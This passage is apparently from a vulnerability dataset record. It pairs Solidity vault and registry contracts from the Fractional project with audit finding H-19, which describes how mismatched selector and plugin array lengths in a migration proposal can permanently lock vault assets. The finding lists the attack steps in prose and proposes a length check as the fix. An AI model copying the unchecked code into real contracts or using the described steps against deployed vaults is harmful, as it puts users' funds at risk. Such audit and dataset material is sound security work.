_newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {ClonesWithImmutableArgs} from \"clones-with-immutable-args/src/ClonesWithImmutableArgs.sol\";\nimport {FERC1155} from \"./FERC1155.sol\";\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {IVaultRegistry, VaultInfo} from \"./interfaces/IVaultRegistry.sol\";\nimport {VaultFactory} from \"./VaultFactory.sol\";\n\n/// @title Vault Registry\n/// @author Fractional Art\n/// @notice Registry contract for tracking all fractional vaults\ncontract VaultRegistry is IVaultRegistry {\n    /// @dev Use clones library with address types\n    using ClonesWithImmutableArgs for address;\n    /// @notice Address of VaultFactory contract\n    address public immutable factory;\n    /// @notice Address of FERC1155 token contract\n    address public immutable fNFT;\n    /// @notice Address of Implementation for FERC1155 token contract\n    address public immutable fNFTImplementation;\n    /// @notice Mapping of collection address to next token ID type\n    mapping(address => uint256) public nextId;\n    /// @notice Mapping of vault address to vault information\n    mapping(address => VaultInfo) public vaultToToken;\n\n    /// @notice Initializes factory, implementation, and token contracts\n    constructor() {\n        factory = address(new VaultFactory());\n        fNFTImplementation = address(new FERC1155());\n        fNFT = fNFTImplementation.clone(\n            abi.encodePacked(msg.sender, address(this))\n        );\n    }\n\n    /// @notice Burns vault tokens\n    /// @param _from Source address\n    /// @param _value Amount of tokens\n    function burn(address _from, uint256 _value) external {\n        VaultInfo memory info = vaultToToken[msg.sender];\n        uint256 id = info.id;\n        if (id == 0) revert UnregisteredVault(msg.sender);\n        FERC1155(info.token).burn(_from, id, _value);\n    }\n\n    /// @notice Creates a new vault with permissions and plugins\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    function create(\n        bytes32 _merkleRoot,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) external returns (address vault) {\n        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);\n    }\n\n    /// @notice Creates a new vault with permissions and plugins, and transfers ownership to a given owner\n    /// @dev This should only be done in limited cases i.e. if you're okay with a trusted individual(s)\n    /// having control over the vault. Ideally, execution would be locked behind a Multisig wallet.\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _owner Address of the vault owner\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    function createFor(\n        bytes32 _merkleRoot,\n        address _owner,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) external returns (address vault) {\n        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);\n        IVault(vault).transferOwnership(_owner);\n    }\n\n    /// @notice Creates a new vault with permissions and plugins for the message sender\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    /// @return token Address of FERC1155 contract\n    function createCollection(\n        bytes32 _merkleRoot,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) external returns (address vault, address token) {\n        (vault, token) = createCollectionFor(\n            _merkleRoot,\n            msg.sender,\n            _plugins,\n            _selectors\n        );\n    }\n\n    /// @notice Creates a new vault with permissions and plugins for an existing collection\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _token Address of FERC1155 contract\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    function createInCollection(\n        bytes32 _merkleRoot,\n        address _token,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) external returns (address vault) {\n        address controller = FERC1155(_token).controller();\n        if (controller != msg.sender)\n            revert InvalidController(controller, msg.sender);\n        vault = _deployVault(_merkleRoot, _token, _plugins, _selectors);\n    }\n\n    /// @notice Mints vault tokens\n    /// @param _to Target address\n    /// @param _value Amount of tokens\n    function mint(address _to, uint256 _value) external {\n        VaultInfo memory info = vaultToToken[msg.sender];\n        uint256 id = info.id;\n        if (id == 0) revert UnregisteredVault(msg.sender);\n        FERC1155(info.token).mint(_to, id, _value, \"\");\n    }\n\n    /// @notice Gets the total supply for a token and ID associated with a vault\n    /// @param _vault Address of the vault\n    /// @return Total supply\n    function totalSupply(address _vault) external view returns (uint256) {\n        VaultInfo memory info = vaultToToken[_vault];\n        return FERC1155(info.token).totalSupply(info.id);\n    }\n\n    /// @notice Gets the uri for a given token and ID associated with a vault\n    /// @param _vault Address of the vault\n    /// @return URI of token\n    function uri(address _vault) external view returns (string memory) {\n        VaultInfo memory info = vaultToToken[_vault];\n        return FERC1155(info.token).uri(info.id);\n    }\n\n    /// @notice Creates a new vault with permissions and plugins for a given controller\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _controller Address of token controller\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    /// @return token Address of FERC1155 contract\n    function createCollectionFor(\n        bytes32 _merkleRoot,\n        address _controller,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) public returns (address vault, address token) {\n        token = fNFTImplementation.clone(\n            abi.encodePacked(_controller, address(this))\n        );\n        vault = _deployVault(_merkleRoot, token, _plugins, _selectors);\n    }\n\n    /// @dev Deploys new vault for specified token, sets merkle root, and installs plugins\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _token Address of FERC1155 contract\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    function _deployVault(\n        bytes32 _merkleRoot,\n        address _token,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) private returns (address vault) {\n        vault = VaultFactory(factory).deploy();\n        vaultToToken[vault] = VaultInfo(_token, ++nextId[_token]);\n        IVault(vault).setMerkleRoot(_merkleRoot);\n        IVault(vault).install(_selectors, _plugins);\n\n        emit VaultDeployed(vault, _token, nextId[_token]);\n    }\n}\n\n\n",
        "CodeNames": [
            "IBuyout.sol",
            "IMigration.sol",
            "Vault.sol",
            "VaultRegistry.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-19",
                "Location": [
                    "propose()",
                    "install()",
                    "selectors",
                    "plugins",
                    "create()",
                    "settleVault()"
                ],
                "Type": " Migration can permanently fail if user specifies different lengths for  selectors  and  plugins ",
                "Description": "\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L174\n\n\nIn propose() in Migration.sol, there is no check that the lengths of the selectors and plugins arrays are the same. This means that if a migration is successful, the install() function in Vault.sol could revert beacuse we access an array out of bounds. This prevents a new vault being created thereby permanently locking assets inside the vault.\n\n\n1.  User starts a new migration proposal where selectors.length != plugins.length\n2.  Enough users join proposal and the buyout bid starts\n3.  Buyout bid is successful and migration starts with settleVault()\n4.  A new vault is cloned with create() - registry.deployFor() - vault.install(selectors, plugins)\n5.  a. If selectors.length  plugins.length then we get an out of bounds error and transaction reverts\n    b. If selectors.length < plugins.length then the excess values in plugins is ignored which is tolerable\n6.  In scenario a., the migration fails and a new migration cannot start so assets in the vault are permanently locked\n\nThis may seem quite circumstantial as this problem only occurs if a user specifies selectors and plugins wrongly however it is very easy for an attacker to perform this maliciously with no cost on their behalf, it is highly unlikely that users will be able to spot a malicious migration.\n\n\nVS Code\n\n",
                "Repair": "\nConsider adding a check in propose() to make sure that the lengths match i.e.\n\nsolidity\nfunction propose(\n        address _vault,\n        address[] calldata _modules,\n        address[] calldata _plugins,\n        bytes4[] calldata _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external {\n        // @Audit Make sure that selectors and plugins match\n        require(_selectors.length == _plugins.length, \"Plugin lengths do not match\");\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Initializes migration proposal info\n        Proposal storage proposal = migrationInfo[_vault][++nextId];\n        proposal.startTime = block.timestamp;\n        proposal.targetPrice = _targetPrice;\n        proposal.modules = _modules;\n        proposal.plugins = _plugins;\n        proposal.selectors = _selectors;\n        proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(\n            _vault\n        );\n        proposal.newFractionSupply = _newFractionSupply;\n    }\n\n\nAdditionally, I would suggest adding such a check in the install() function as this may prevent similiar problems if new modules are added.\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/115)\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/115#issuecomment-1214467110):\n  A misconfiguration of a migration can result in permanently locked up funds. Agree with High risk here.\n\n\n\n*\n\n\n"
            }
        ]
    }
]